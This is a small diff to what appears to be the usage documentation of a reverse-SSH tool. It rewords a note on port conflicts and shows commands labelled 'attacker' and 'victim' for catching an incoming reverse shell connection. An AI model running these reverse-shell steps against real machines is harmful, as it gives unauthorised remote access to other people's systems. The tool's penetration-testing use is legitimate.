@@ -84,7 +84,7 @@ attacker$ssh -p 31337 <LHOST>
 ```shell
 # On attacker (get ready to catch the incoming request;
 # can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
-# NOTE: LPORT must NOT be 8888, as it'll cause a conflict.
+# NOTE: LPORT of 8888 collides with incoming connections; use the flag `-b 8889` or similar on the victim in that case
 attacker$./reverse-ssh -l :<LPORT>
 
 # On victim
